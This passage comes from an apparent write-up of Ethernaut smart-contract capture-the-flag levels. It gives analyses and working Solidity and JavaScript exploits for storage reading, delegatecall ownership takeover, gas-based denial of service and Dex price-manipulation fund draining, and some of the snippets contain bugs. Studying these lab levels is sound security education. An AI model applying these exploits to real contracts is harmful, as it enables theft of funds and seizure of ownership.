it to multipliers of 10 and so on.\n\nChallenge solved ✅\n\n## Elevator\n\n`with trust, everyone can get to the last floor`\n\n**Challenge description**\n\nThis elevator won't let you reach the top of your building. Right?\n\n--------\n**Analysis**\n\n![Elevator method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851_rpolcp.png)  \nThis function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :\n\n1. `Elevator` contract has no control over the logic of the `Building` contract.\n2. The `goTo` function is actually `public` which makes it possible to have some state changes inside it.\n\nAnd all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top.\n\n-----\n**Exploitation**\n\n```js\ninterface Elevator { \n function goTo(uint _floor) external;\n}\n\ncontract EvilBuilding { \n    uint count= 0; \n    function isLastFloor(uint) external returns (bool){ \n        count ++ ; \n        return count%2==0 ? true : false; // The first time will pass false the second true\n    }\n\n    function callAttack(address ElevatorAddress) public {\n        Elevator elevatorContract = Elevator(ElevatorAddress);\n        elevator.goTo(10); // put any number here really\n    }\n}\n```\n\nChallenge solved ✅\n\n## Privacy\n\n**Challenge description**\n\nThe creator of this contract was careful enough to protect the sensitive areas of its storage.\nUnlock this contract to beat the level.\n\n--------\n**Analysis**\n\n![Privacy storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e_sfqspe.png)  \n\nAs we said before, every variable in the storage can be accessed all we have to do is find which slot it's residing in. Same applies here.\n\nWe got the following:\n\n```js\n// [0] bool locked\n// [1] uint256 ID\n// [2]      awkwardness | denomination | flattening\n// arrays start always in a new slot \n// [3] bytes32 data[0]\n// [4] bytes32 data[1]\n// [5] bytes32 data[2]\n```\n\n-----\n**Exploitation**\n\nWe know the position of the password . We can unlock the contract. \n\n```js\nawait contract.getStorageAt(INSTANCE_ADDRESS,5);\n/// We can manually extract the least significant 16 bytes or simply write a util contract like below\n```\n\n```js\ncontract Utils { \n    function get16Bytes(bytes32 value) public returns (bytes16) {\n        return bytes16(value);\n    }\n}\n```\n\n```js\nawait contract.unlock(Returned_Value);\n```\n\nChallenge solved ✅\n\n## Gatekeeper One\n\nThis challenge gave me hard time, two days to solve it but I learnt a lot during those days.\n\n**Challenge description**\n\nMake it past the gatekeeper and register as an entrant to pass this level.\n\n--------\n**Analysis**\n\nOkay so we got three modifiers, each one represents a `barrier` we need to break through. I will be going through each modifier one by one.\n\n#### gateOne\n\nLooking to this gate it sounds really familiar\n\n![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e_eyyyd2.png)  \n\nIt implies that we should be using another contract to interact with the gate.\n\n#### gateThree\n\nI will leave gateTwo the last one as it's the most annoying ( not hard ) one to pass.\n\n![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a_bg3gdk.png)  \n\nWe got three conditions to pass and lot of type conversion 🙂.It's time we learn how conversions works in solidity [Solidity Type conversions](https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions)\n\nLet's go through each condition one by one\n\n1. First condition\n\n```js\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n```\n\nLet's say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have \n\n*uint16 == uint32* which translates to 0x0000AAAA== 0xAAAA. => uint64(_gateKey) = 0x????????0000AAAA\n\n2. Second Condition\n\n```js\nrequire(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n```\n\n**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the `?` are different than zeros.\n\n3. Last condition\n\n```js\nrequire(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n```\n\nIt just tells us that the `AAAAA` should be derived from the `tx.origin` value.\n\nOkay to sum it up we have the format of `0xFFFFFFFF0000FFFF` for our contract. so we can get the values by using a logical operator `&`.\n\n#### gateTwo\n\n![Gateekeeper gateTwo](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf_f9rwex.png)  \n\nwhat is the `gasleft` function ?\nthe gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?\nwe can check the website [Opcodes, EVM](https://www.ethervm.io/), actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.\n\n-----\n\n**Exploitation**\n\n1. We should call the contract from our `Evil Contract` so we bypass the first gate\n2. We should make sure the key adhere to the key format we found.\n3. We need to pass a gas value that passes the condition.\n    > However when searching for that gas value we can\n        1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)\n        2. Use the debugger to check the gas value at the condition check.\n        3. Just don't, if you are impatient brute force it. That's what I did when I got low on caffeine and the music stopped.\n\n![Debugging interface](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/18f23b5aad25da24fa6fbdc8842fb1ee0568daa3ac723a166802b0cc2dd2518d_yg3ech.png)  \n\nSo here is the final contract\n\n```js\ncontract EvilContract { \n    function getKey() view public returns (bytes8){ \n        return bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; // The first time will pass false the second true\n    }\n    function callAttack(address gateAddress, uint baseGasValue) public returns (bool) {\n        bytes8 gateKey = getKey();\n        uint i;\n\n        for (i=0;i<300;i++)\n        {\n        (bool result,) =  gateAddress.call{gas:gasValue}(abi.encodeWithSignature(\"enter(bytes8)\", baseGasValue+100+8191*4));\n        if(result) return result;\n        }\n        return false;\n    }\n}\n```\n\nHappy hacking ! You may rest traveler , The next gate will be some kind of a boss fight.\n\nChallenge solved ✅\n\n## GateKeeper Two\n\n> Time to delve deep in the ethereum blockchain\n\n**Challenge description**\n\nI will sum up we need to pass the gate and learn many things.\n\n--------\n**Analysis**\n\nAs usual here we got three modifiers to pass. We will be going through each modifer one by one from the easiest to the hardest.\n\n![Gatekeeper contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/193982e4a19ec767e0759ab2e9adc2e16865502b0625e6eb22fc0a39e11418d7_k0ahq6.png)  \n\n#### GateOne\n\n```js\nmodifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n```\n\nOkay we need to call the `GatekeeperTwo` from another contract.\n\n#### GateTwo\n\n```js\nmodifier gateTwo() {\n    uint x;\n    assembly { x := extcodesize(caller()) }\n    require(x == 0);\n    _;\n  }\n```\n\nOww a new keyword `assembly` what's that ? \n![Solidity Documentation Screenshot - assembly keyword](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/2cb6f44375d3fb1a39d4e147414218e8f9d1b7fe5a98c873c4469082b7fba674_qlucds.png)  \n\nSo we have now a clear idea of the assembly keyowrd and it's capabilities, that might remind you a little bit of how the `C` language works ! \nFor the `extcodesize` the code snippet below taken from the docs explains it all.\n\n```js\n// retrieve the size of the code, this needs assembly\n            let size := extcodesize(addr)\n```\n\nFor the `caller()` it returns the address of the caller. it might be an account or another contract. Actually, this `consensys` which a great resource for smart contract security explains it all .\n\n> the idea is straightforward: if an address contains code, it's not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.\n\n[Consensys Page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)\n\nSo we now know to pass this gate we need to call the method `enter` in the constructor of our *EvilContract*\n\n### gateThree\n\nThis gate resembles gateThree of *GateKeeper One* it's about performing the right logical operations and finding the gateKey.\n\n```js\n modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n    _;\n  }\n```\n\nLet's evalulate the *right* side of the equality. Remember the *Token* Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value `0xFFFFFFFF`.\nFor the *left* side of the equality we got an **XOR** operation. **XOR** verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let's ignore the conversion it won't change anything actually because we can reverse it to get the _gateKey later.\n\nSo the equation we have : \n\n**A** =  `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n**B** = `uint64(_gateKey)`\n**C** = `uint64(0) - 1`\n\nHere is what we need to do ! Read carefully this wikipedia page if you need to understand how it works on bit level. [Wikipidea XOR Article](https://en.wikipedia.org/wiki/XOR_cipher)\n![XOR Wikipedia Screenshot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/01a9f0d0791a8896c4b6109abc576acbfbccade8b44817fa1abd2f245eb99700_lii5bn.png)  \n\n`A ^ B = C , B = ? ==> B = A ^ C`\nWhich translates to\n`gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1);`\n\n-----\n**Exploitation**\n\nLet's craft our *EvilContract*\n\n```js\ncontract EvilContract { \n\n    function getOperationResult() public pure returns (uint64){\n        uint64 x =0; \n        return x - 1;\n    }\n\n   function getGateKey() public view returns (bytes8){ \n       uint64 x = getOperationResult();\n     return   bytes8(x ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));\n   }\n\n   \n   constructor(address gateAddress) public {\n       GateTwo gateTwoContract= GateTwo(gateAddress);\n       bytes8  gateKey =getGateKey();\n      bool state= gateTwoContract.enter(gateKey);\n     require(state);\n   }\n   \n}\n```\n\nWe pass our instance address to the constructor.\n\nChallenge solved ✅\n\n> I was late, I couldn't join theCyber club 🥲\n\n## Naught Coin\n\n> RTFM\n\n**Challenge description**\n\nNaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.\n~ A bunch of useful references we will be going through in analysis\n\n--------\n\n**Analysis**\n\n![Naught Coin contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/264f925aeaf5e08d9758746a1f9774a6a2194df257f8dd0a92a00b4b820881d7_dm5hut.png)  \n\nThe contract is an implementation of the ERC20 specification.\n\n*How it works ?*\nWe create tokens that can be traded between the users of our contract. Our contract is responsible for setting the total supply and modifying it, keeping track of users balance and one other useful feature allowing and disallowing the ones who can spend/trade tokens from each account remember that it will be useful.\n\nThe logic is flawless and the condition cannot be bypassed.\n\n```js\n      require(now > timeLock);\n```\n\nBut our contract is inheriting from the ERC20 of openzeppelin and we can see something is wrong.\n\n![ERC20 openzeppeling](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/1ec4088e0ffadccfa057b1c022c8d4fb51d1475ef0e0018a4e32b7b1beab92e0_iagggl.png)  \n\nWe got another method for transferring tokens ! cool but wait *he caller must have allowance for ``from``'s tokens of at least amount* so msg.sender needs to have an allowance of the amount.\nand allowance can be set by calling..\n\n![ERC20 openzeppelin](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/47b72aa9c7060cd02c197e1de9e50fb4f53f3b5a7d7e6e9f0c946807ec700df9_gsugja.png)  \n\nOkay we got everything let's -----\n**Exploitation** it\n\n**Further Reading** [ERC20 API: An Attack Vector on Approve/TransferFrom Methods](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit#)\n\n-----\n**Exploitation**\n\n```js\nconst balance = (await contract.balanceOf(player)).toString();\nawait contract.approve(player,balance);\nawait contract.transferFrom(player,ANY_OTHER_ADDRESS,balance);\n```\n\nChallenge solved ✅\n\n## Perservation\n\n**Challenge description**\n\nThis contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n--------\n**Analysis**\n\nI explained well the `delegateCall` function before and how it runs in the caller context but I left the context a little blurry so let's define it.\nThe context here is the storage variables or let me call them `state variables` they are defined in the contract address and the called contract will handle them *blindly* which means he will assume that\n\n*Storage layout of the caller*  == *Storage layout of the callee*\n\nLet's look to our contract now.\n\n![Perservation contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/0cded2638e39c98dee9e35690675e5a299c3628f81c9bdb1375a708b5e209098_ecu1g4.png)  \n\nThe interesting bits are : \n\n```js\n  //inside the library contract\n  uint storedTime;  \n\n   function setTime(uint _time) public {\n    storedTime = _time;\n  }\n```\n\n```js\n // inside the vulnerable contract\n address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n```\n\nI guess you got an idea what will happens with the delegateCall ? `storedTime` is actually our `timeZone1Library` variable they are both at `slot[0]` of the storage so it will be set instead. \nand the `setSecondTime` does the same thing as the `setFirstTime` in this case.\n\n-----\n**Exploitation**\n\n1. Create an evil contract that implements `setTime(uint)` and has the same storage layout as the vulnerable contract ( by declaring the same variables in the same order 😄)\n2. call the `set_X_Time` of the vulnerable contract by passing uint(evilcontractAddress) as paramater\n3. call the method again now our evilContract function will be triggered to set owner = ourAccount;\n\nLet's craft the *EvilContract*\n\n```js\ncontract EvilContract {\n\n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  \n  // These variable are useless because we won't to ensure that the owner is in slot[2] \n  // we don't really care about the slots that comes after\n  uint storedTime;\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n   function setTime(uint _time) public {\n    owner = 0x84e7a3679A82C2766Ff8382862ab883FF9460307;\n   }\n\n   function getParam() view public returns (uint){\n        return uint(address(this));\n   }\n}\n```\n\nChallenge solved ✅\n\n**Further Reading** [Preventing Smart Contract Attacks on Ethereum — “DELEGATECALL”](https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-delegatecall-e864d0042188)\n\n## Recovery\n\n> Forensics in the blockchain world !\n\n**Challenge description**\n\nA contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.\n\nThis level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.\n\n--------\n**Analysis**\n\n**the problem**\n\n```js\n    new SimpleToken(_name, msg.sender, _initialSupply);\n```\n\n> A contract can create other contracts using the new keyword. The full code of the contract being created has to be known when the creating contract is compiled so recursive creation-dependencies are not possible.\n\n[Solidity Docs - New keyword](https://docs.soliditylang.org/en/v0.8.15/control-structures.html?highlight=new%20keyword#creating-contracts-via-new)\n\nthe `new` keyword returns the address of the created contract but here it's not saved and there is no way to retrieve it from the contract state. But we are in the blockchain world where transparency rules ! All transactions are saved and we can actually find the created contract.\n\n-----\n**Exploitation**\n\n1. Go to [Etherscan](https://rinkeby.etherscan.io/)\n2. Search for your instance address\n3. You will find something similar to this, click it !\n![Recovery instance contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/93668187b141f813b187b92cf0e33ff963269e40cd11b36386300e201af120c9_atmryc.png)  \n\n4. Check the balance to be sure that it's the created contract.\n\n ![Recovery created contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/106328b15039a3d164b45720563251c6f628e2907732a9b997514327aac3f457_vnq6mh.png)  \n\n6. call the destroy function with your wallet address as paramater\n\nHere is a simple contract to call the destroy function :\n\n```js\ninterface SimpleToken {\n      function destroy(address payable _to) external ; \n}\n\ncontract Recover {\n\n    function recoverFunds(address contractAddress, address payable myAddress) public {\n        //  (bool success, ) = contractAddress.call(\n        //     abi.encodeWithSignature(\"destroy(address payable)\", myAddress));\n        //  require(success);   \n\n        // or a cleaner way \n        SimpleToken tokenContract = SimpleToken(contractAddress);\n        tokenContract.destroy(myAddress);\n    }\n\n    function verifyBalance(address contractAddress) public view returns (uint){\n        return contractAddress.balance;\n    }\n}\n```\n\n## Magic Number\n\n**Challenge description**\n\n> To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.\nEasy right? Well... there's a catch.\nThe solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 opcodes at most.\n\n--------\n**Analysis** \n\nWriting Opcode instead of plain solidity.  **It's not that hard right ?** *right?* \nOkay Let's dive in one by one till we understand how everything works. I  will be writing some pseudo/solidity code for analogy.\n\n```js\n//\nfunction whatIsTheMeaningOfLife(){\n    return 42;\n}\n\n```\n\n`a contract that responds to whatIsTheMeaningOfLife()` fallback function can answer that so let's make things more simple\n\n```js\nfunction(){\n    return 42;\n}\n```\n\nLet's translate it line by line to opcode. I found this magnificent reference [EtherVM](https://www.ethervm.io/#02). I really like the table view instead of navigating page by page through the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf).\n\n```js\nreturn 42; \n---------   \nPUSH1 0x42 //  our value\nPUSH1 0x80 //  memory position\nMSTORE // stores the 42 into memory location 0x80\nPUSH1 0x20 // the length of the value\nPUSH1 0x80 // memory position ( again )\nRETURN // returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !\n\n// *10 bytes total*\n```\n\n`PUSH1 VALUE` pushes a 1-byte value onto the stack.\n`MSTORE` writes a (u)int256 to memory takes (offset,value) as args\n\n> The ethereum evm is a [Stack Machine](https://en.wikipedia.org/wiki/Stack_machine). args comes from the stack and return values are written into the stack.\n\n> In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use [A deep-dive into Solidity – contract creation and the init code](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/)\n\nNow we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two *initialization opcodes* and *runtime opcodes*. The *initialization opcodes* are the one responsible for the creation of the contract by executing the constructor and copying the *runtime opcodes* into the memory because the *runtime opcodes* is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the *runtime opcodes*. Let's define our *initilization opcodes*\n\n```js\n// copy the runtime code into memory with codecopy(length,offset,dest)\nPUSH 0x0a // 10 bytes of runtime opcodes\nPUSH 0x0c // 13 bytes of initialization opcodes ( I didn't guess it I have actually calculated after writing the whole thing )\nPUSH 0x00 // memory offset\nCODECOPY\n\n// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code\nPUSH 0x0a \nPUSH 0x00\nRETURN\n```\n\n-----\n**Exploitation**\n\nTo craft our payload we will convert the instruction to pure bytes. That's fairly easy. We view [EtherVM](https://www.ethervm.io/#02) to view the bytes of each instruction and for the values we discard the `0x` (`0x0a` => `0a`)\n\n                       [ Initialization bytes    |    Runtime bytes ]\nSo our final payload : `600a600c600039600a6000f3604260805260206080f3`\n\nWe open the console to create our contract and set it as the solver.\n\n```js\nconst tx = await web3.eth.sendTransaction({from:player,data:'600a600c600039600a6000f3604260805260206080f3'});\nawait contract.setSolver(tx.contractAddress);\n```\n\nChallenge solved ✅\n\n## Alien Codex\n\n**Challenge description**\n\nYou've uncovered an Alien contract. Claim ownership to complete the level.\n\n    Understanding how array storage works\n    Understanding ABI specifications\n    Using a very underhanded approach\n\n--------\n**Analysis**\n\nFirst look at the contract code nothing comes to my mind. The Ownable contract is actually `openzeppelin` Ownable and I looked into its source code and the only useful thing I got is it saves `address owner`.\n\n Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack. We have to use `keccack265(length_position)` to find the first slot of array data.\n\nSo how can we -----\n**Exploitation** that ?\n\n![Alien Codex method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/86f1f291d81ff664dbe3c9afd11c315bb31de2e0a3283a0f8d964b43e9bf44eb_tcxxpp.png)  \n\nWe got 2 slots taken from the whole storage. If we make the length of the array takes up the whole storage then we can overwrite any value of it. `retract` allows that, the `array.length` is `uint256`. \n\nAfter taking up the whole storage we need to find the position of the owner variable.\nOur current storage layout is.\n\n```js\n/* STORAGE\n* [0]: contract + owner , \n* [1]: codex\n* keccak256(1) : codex[0]\n*       ..\n*        ..\n* [2^256]: 0x000000000\n*/\n```\n\nWe want to overlap and get to slot[0] to set it. We can calculate the index of that element by `2^256 - keccack(256)(1) +1`\n\n-----\n**Exploitation**\n\nfirst we call the `retract` to set the array length to max.\n\n```js\nawait contract.retract()\n```\n\nthen we get our payload, here is a utils contract.\n\n```js\ncontract Utils { \n\n    function getNumber() public pure returns (uint256){\n      uint256 x =0;\n        \n        // return x-1 - uint256(keccak256(abi.encodePacked(uint256(1))))+1;\n        \n        return x - uint256(keccak256(abi.encodePacked(uint256(1))));\n    }\n}\n```\n\nWe check if we got it right 😄\n\n![Alien Codex - check](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/03ed7019523687b6195b1e2824212ccf9c27300ff053773c2f5b93ea5b79580d_boj4jy.png)  \n\nno need to be puzzled we know what it is it's the contact value + \n\n![Alien Codex - Level address](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/9faab8cbd57b86461622fa7e3aad8dab64aed6c6d4a52a4ee19088857b840d21_pzx1am.png)  \n\nSo our payload should be \n\n```Js\n0x00000000000000000000000184e7a3679A82C2766Ff8382862ab883FF9460307\n0x000000000000000000000001YOUR_ADDRESS_HERE\n```\n\nChallenge solved ✅\n\n## Denial\n\n> There is a way to using `addr.call{value:x}(\"\")`, only that it forwards all remaining gas and opens up the ability to perform more expensive actions ( and it returns a failure code instead of propagating the error )  ~ Solidity docs\n\nThat's all we need. So I lost quite bit of time looking for a way to reach the call stack depth limit ( which is 1024 ). But it was more the hard way of doing things.  What if we didn't leave the caller contract enough gas to transfer the 1% of the owner ? Yes that's really it !\n\n-----\n**-----\n**Exploitation**ation**\n\nOur evil contract, btw don't try to run it on Remix as it will crash instead use truffle console or something similar to try it \n\n```js\ncontract EvilContract { \n    receive() external payable {\n        while(true);  // the line that crashed my whole VM\n    }\n}\n```\n\nChallenge solved ✅\n \n > This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.\nIf you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().\n\nTypically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.\n\nNote: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.\n\n\n## Shop\n\n```js\ninterface Shop {\n\n  function buy()  external ;\n  function isSold()  external view returns (bool) ;\n  }\n\ncontract EvilContract { \n    address victimAddress;\n    Shop shopContract;\n\n    function setVictimAddress( address _victimAddress) public { \n        victimAddress= _victimAddress;\n        shopContract = Shop(_victimAddress);\n    }\n\n    function price() external view returns (uint){\n        return shopContract.isSold()?0:100;\n    }\n\n    function buy() public {\n        shopContract.buy();\n    }\n}\n```\n\n## Dex\n\n`This challenge and it's second version will have the same solution basically with a little tweak. Better understand the concept`\n\n**Challenge description**\n\n>The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.\nYou will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a \"bad\" price of the assets.\n\n--------\n**Analysis**\n\nThe logic is faultless or is it ?  Well to be honest had to try many things here. One thing that got my attention that the equation made to calculate the swap_amount was familiar but not that much\n\n![Dex Equation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/17dcc969cfc52464829cb1a88231824931fda3a5b0d0b1d3d446eaf763974942_xxpfji.png)\n\nA good read to understand it [Amazing Article to understand AMM](https://www.gemini.com/cryptopedia/amm-what-are-automated-market-makers).\n\nSo actually by balancing our token balance from one token to another we will manage at last to drain the contract's balance of one token's type.\n\n-----\n**-----\n**Exploitation**ation**\n\n```js\nconst contractABI = artifacts.require(\"Dex\");\n\n// if token1.balance > token2.balance ==> token2 is more expensive because it has less tokens\n// we want to trade the most expensive tokens\n// knowTokenValues() ==> Distiniguishing the most expensive and cheapest token\n// getSwapValues() // Basically our balance in the most expensive token\n// ==============================\n\nlet contract ;\nconst TOKEN1_ADDRESS = \"0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7\";\nconst TOKEN2_ADDRESS = \"0xE651aD37ac31B03F7B49036248A29DC75D0093E6\";\nlet PLAYER='PLAYER_ADDRESS'\n\nasync function getBalances(){\n    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();\n    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();\n    console.log(`Current Balances for contract : A : ${token1Balance} \\t B : ${token2Balance}`);\n    return {token1Balance,token2Balance}\n}\n\n function knowTokenValues({token1Balance,token2Balance}){\n    return {mostExpensiveToken: token1Balance >= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance < token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };\n}\n\nasync function getSwapValues(tokensWithValues){\n    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();\n    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();\n\n    // to be able to drain the funds and not stop when we got too much tokens.\n    if(toSwap>available)toSwap=available;\n\n    return toSwap;\n}\n\n\nasync function drainFunds(){\n    \n    let flag=true; // check condition\n\n    // approving otherwise you will get an error due to how ERC20 works.\n    await contract.approve(contract.address,10000,{from:PLAYER});\n\n    while(flag){\n        const balances = await getBalances();\n        const tokenValues =  knowTokenValues(balances);\n        const toSwap = await getSwapValues(tokenValues);\n        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});\n        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);\n\n        flag = token1Balance*token2Balance>0;\n    }\n    \n    console.log(\"Hacked !\")\n}\n\n\nmodule.exports = async  function(deployer) {\n  \n  contract = await contractABI.at(\"0xBa71E2eEF0D68C5aBCDe6dF3EEf9377b9eD9E78C\"); \n  await drainFunds();\n};\n```\n\n![Dex console](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138023/852281f645c829a2d76b966618bbb6c25f1c4721506ecca9de0e7e6ef4fab42f_dw1jen.png)  \n\n## Dex 2\n\n## Challenge Description\n\nSame as Dex v1 but now we need to drain both tokens.\n\n--------\n**Analysis**\n\nSame here but we got one less check that makes it possible to inject a third token and thus draining both contract's main tokens' balance.\n\n![Dex 2 Function](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/aeb9bb0ecc92f4b707acbc9170c3bd3355c4361d3523704a799bc8717093366d_ogt3sr.png)  \n\n-----\n**-----\n**Exploitation**ation**\n\n```js\nconst contractABI = artifacts.require(\"Dex\");\n\nlet contract ;\nlet TOKEN1_ADDRESS = \"0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7\";\nlet TOKEN2_ADDRESS = \"0xE651aD37ac31B03F7B49036248A29DC75D0093E6\";\n\nconst TOKEN3_ADDRESS= \"0xfe5A0de02e7c76f2A51e3d297e65ccE784787538\"\n\nlet PLAYER='0x84e7a3679A82C2766Ff8382862ab883FF9460307'\n\nasync function getBalances(){\n    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();\n    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();\n    console.log(`Current Balances for contract : A : ${token1Balance} \\t B : ${token2Balance}`);\n    return {token1Balance,token2Balance}\n}\n\nasync function knowTokenValues({token1Balance,token2Balance}){\n    return {mostExpensiveToken: token1Balance >= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance < token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };\n}\n\nasync function getSwapValues(tokensWithValues){\n    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();\n    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();\n\n    // making sure at the end when we get most of balance in one token type we can still get the rest of the tokens.\n    if(toSwap>available)toSwap=available;\n\n    return toSwap;\n}\n\n\nasync function drainFunds(){\n    \n    let flag=true;\n    await contract.approve(contract.address,10000,{from:PLAYER});\n    while(flag){\n        const balances= await getBalances();\n        const tokenValues= await knowTokenValues(balances);\n        const toSwap = await getSwapValues(tokenValues);\n        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});\n        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);\nflag = balances.token1Balance*balances.token2Balance>0;\n    }\n    // Token2 balance  = 0. Make sure to set the token3 value to the same value as token1 at the end of this loop.\n\n    flag = true;\n     TOKEN2_ADDRESS=TOKEN1_ADDRESS;\n     TOKEN1_ADDRESS=TOKEN3_ADDRESS;\n\nwhile(flag){\n        const balances= await getBalances();\n        const tokenValues= await knowTokenValues(balances);\n        const toSwap = await getSwapValues(tokenValues);\n        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});\n        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);\n\n        flag = balances.token1Balance*balances.token2Balance>0;\n    }\n    